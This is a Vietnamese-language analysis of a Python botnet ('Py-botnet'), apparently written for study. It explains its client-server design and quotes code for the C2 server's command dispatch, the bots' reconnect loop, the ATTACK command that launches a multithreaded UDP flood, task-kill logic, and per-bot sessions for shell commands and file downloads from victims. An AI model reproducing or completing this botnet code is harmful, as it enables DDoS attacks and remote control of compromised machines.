# Phân tích code Py-bonet

---

##	Cấu trúc
Py botnet này có kiến trúc client-server tập trung.
-	Server.py đóng vai trò C2/C&C server: chờ bot kết nối vào, liệt kê bot, gửi lệnh, mở phiên điều khiển riêng, phát lệnh tấn công và dừng tác vụ. 
-	Client.py đóng vai trò bot: tự kết nối tới server, nhận lệnh, thực thi các chức năng như ping, shell command, tải file từ máy nạn nhân và thực hiện UDP flood.
##	Cách hoạt động của py-botnet
-  Client kết nối đến server.
-  Server nhận lệnh từ người điều khiển.
-  Server gửi lệnh cho các client.
-  Client nhận lệnh và thực thi hành động tương ứng.
-  Nếu lệnh là ATTACK, client sẽ tạo nhiều thread để thực hiện UDP Flood DDoS.
## 1.	Client kết nối đến server.
### 1.1.	 Phía Server
Phía server sẽ tạo 1 socket TCP, bind vào địa chỉ cấn hình và lắng nghe kết nối:

```
def create_connection(self, connect:Tuple[str,int]) -> bool:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(connect)
    sock.listen(BACKLOG)
    sock.settimeout(0.5)
    return sock
```

+ AF_INET sẽ chỉ định việc sử dụng họ địa chỉ IPv4 và SOCK_STREAM xác định giao thức truyền tải là TCP

	Server chạy 1 luồng riêng để chấp nhận client:

```
	def accept_connections(self):
    while not self.stop:
        try:
            conn, address = self.sock.accept()  
            conn.setblocking(0)
            self.connections.append(conn)
        except socket.timeout:
            continue
        except socket.error:
            continue
```

+ Khi có client kết nối thành công, server nhận được conn và lưu vào self.connections
### 1.2.	 Phía client
Chương trình sẽ liên tục gửi kết nối đến server trong vòng lặp liên tục

```
while not self.stop:
    try:
        self._connect(addr)
    except KeyboardInterrupt:
        continue
    except Exception as ex:
        print(f"Error connecting {addr}| Sleep 0 seconds")
        sleep(0)
```

Hàm kết nối:

```
def _connect(self, connect:Tuple[str,int]) -> None:
    self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  //chỉ định việc sử dụng IPv4 và giao thức TCP
    self.conn.connect(connect)
    self.start()
```

+ Nếu kết nối thành công sẽ chuyển sang hàm start()
## 2.	Server gửi lệnh cho các client
-Sau khi server kết nối với client và nhận lệnh từ attacker, Server sẽ gửi lệnh đó đến các Client đang kết nối như 1 trung tâm điều phối:

```
def send(self, data:Request):
    for i, conn in self.get_connection():
        conn.send(data.get_payload())
```

+Server duyệt qua toàn bộ danh sách Client và gửi gói dữ liệu bằng conn.send(data.get_payload())  với dữ liệu gửi đi là các request đã được đóng gói
-Client sau khi kết nối sẽ trong trạng thái chờ, Client nhận dữ liệu bằng hàm:

```
def recv(self) -> Response:
    data = self.conn.recv(MAX_CHUNK_SIZE)
    if not data:
        return None
    res = Response(data)
    return res
```

+ self.conn.recv(): dùng để nhận dữ liệu từ Server thông qua socket
+ Response(data): tạo 1 đối tượng response(data) để phân tích nội dung lệnh
Sau khi nhận,  client sẽ xử lý trong hàm start():

```
def start(self) -> None:
    while True:
        response = self.recv()
        cmd = response.cmd
        ack = response.cmd
        params = response.params.split(" ") if response.params else response.params
        if response._direct:
            self.method_direct(cmd, ack, params)  //Xác định loại request
        elif response._connect:
            self.method_connect(cmd, ack, params)   //Xác định loại request
        else:
            print("Invalid command")
```

Sau khi xác định lệnh tương ứng, client sẽ gọi hàm tương ứng để xử lý DIRECT hoặc CONNECT

## 3.	Một số lệnh Server sẽ gửi và cách Client thực hiện để phục vụ cho tấn công:
### 3.1.	 Lệnh PING
-Server gửi:

```
def cmd_ping(self):
    self.send(Request(cmd="PING"))
    self.display_output()
```

-Client sẽ phản hồi:

```
def direct_ping(self, ack:str, params:str) -> None:
    if ack:
        self.send(Request("Pong"))
```

+ Server gửi PING đến tất cả bot, nếu Client nhận được sẽ phản hồi Pong để Server kiểm tra xem bot có hoạt động không
### 3.2.	Lệnh ATTACK
-Server:

```
def cmd_attack(self, *params:List[str]):
    if len(params) != 4:
        print("Invalid params")
        return
    hash = self.get_hash("ATTACK", params)  
    self.send(Request(cmd="ATTACK", body=dict(params=' '.join(params))))
    self.tasks[hash] = {
        "cmd": "ATTACK",
        "params": params,
        "time": time(),
    }
    self.display_output()
```

+Hash dùng để ghi nhận task tấn công và lưu lại
+ self.send(Request(cmd="ATTACK", body=dict(params=' '.join(params)))) để gửi lệnh ATTACK đến các client kèm các tham số mục tiêu
-Client:

```
def direct_attack(self, ack:str, params:str) -> None:
    host, port, timeout, threads = params

    port = int(port)
    timeout = int(timeout)
    threads = int(threads)
    hash = self.get_hash("ATTACK", params)
    self.tasks[hash] = dict(run=True)  //Lưu lại task
    manager = UDPFloodManager(self, host, port, timeout, threads, hash)
    manager.start()
    self.tasks[hash]["manager"] = manager
    if ack:
        self.send(Request("Task started successfully {}".format(hash)))
```

+ Sau khi nhận lệnh, client sẽ tách các tham số nhận được, tạo lại hash để định danh task và lưu lại. Sau đó truyền các tham số vào UDPFloodManager để thực hiện tạo nhiều luồng tấn công
Để tạo nhiều luồng tấn công:

```
for _ in range(self.max_threads):
    thread = UDPFlood(self.host, self.port, self.timeout, self.update_data, self.run_until_fn) //Tạo ra một luồng flood mới
    thread.start() //Sau khi start thì sẽ tự động thực thi hàm run() của đối tượng Thread
    self.threads.append(thread)
```

+ Chương trình sẽ tạo nhiều luồng song song, cùng một kiểu flood đến mục tiêu
+ self.host: địa chỉ IP hoặc host mục tiêu
+ self.port: cổng đích
+ self.timeout: thời gian hoặc timeout liên quan đến socket
+ self.update_data: hàm dùng để cập nhật số byte đã gửi
+ self.run_until_fn: hàm kiểm tra xem có tiếp tục chạy hay không

	Hàm run():

```
	def run(self):
    while self.run_until():  //Biến kiểm tra xem có được chạy tiếp hay không
        self.sock.sendto(self.message().encode(), (self.host, self.port))  //Nơi thực hiện flood thực sự
```

+ self.sock là socket UDP đã được tạo trước đó
+sendto(data, address)  là hàm để gửi dữ liệu tới 1 địa chỉ
+Mỗi luồng UDPFLOOD chạy nó sẽ tạo payload trong message() và chuyển sang bytes bằng endcode()
### 3.3.	 Lệnh KILL
-Phía Server:

```
def cmd_kill(self, hash:int):
    hash = int(hash)
    if hash not in self.tasks:
        print("Invalid task id")
        return
    del self.tasks[hash]  // del dùng để xóa task khỏi danh sách
    self.send(Request(cmd="KILL", body=dict(params=hash)))   //tạo 1 request và gửi request đó kèm mã task để client dừng task đó
    self.display_output()
```

+Server sẽ gửi yêu cầu đến client kèm mã của task cần dừng để client dừng cuộc tấn công
-Phía client:

```
def direct_kill(self, ack:str, params:str) -> None:
    hash = int(params[0])
    if hash in self.tasks:
        self.tasks[hash]["manager"].run_until_local = False  // Lấy thông tin của mã task và lấy đối tượng UDPFloodManager của task và cắm cờ dừng cho nó
        if ack:
            self.send(Request("Task killed successfully {}".format(hash)))
```

+ Ở phần trước, manager sẽ kiểm tra cờ run_until_local này trong mỗi lần chạy run(), thế nên nếu cờ là false thì các luồng flood sẽ kết thúc
### 3.4.	 Lệnh KILLALL
-Phía Server:

```
def cmd_killall(self):
    self.send(Request(cmd="STOP"))
    self.display_output()
```

+Server tạo request với lệnh STOP và gửi đén các client
-Phía Client:

```
def direct_stop(self, ack:str, params:str) -> None:
    for hash in self.tasks:
        self.tasks[hash]["manager"].run_until_local = False  // Cắm cờ dừng cho luồng đó
    if ack:
        self.send(Request("All tasks killed successfully"))
```

+ self.tasks[hash]: Lấy thông tin task có mã hash  đó và ["manager"] lấy ra đối tượng UDPFloodManager của task
+ Cắm cờ cho đối tượng đó bằng  false: .run_until_local = False
### 3.5.	 Server CONNECT đến 1 bot cụ thể
-Phía Server:

```
def cmd_connect(self, conn_id:int):
    conn_id = int(conn_id)
    if len(self.connections) < conn_id:
        print("Invalid connection id")
        return
    conn = self.connections[conn_id-1]  //Lấy socket của client
    session = Session(self, conn)   //Tạo 1 phiên làm việc riêng
```

+ Server sẽ không còn gửi lệnh cho tất cả các bot mà chỉ thực hiện với 1 client cụ thể trong session mới tạo, cho phép thực hiện các lệnh riêng như SHELL, DOWNLOAD



















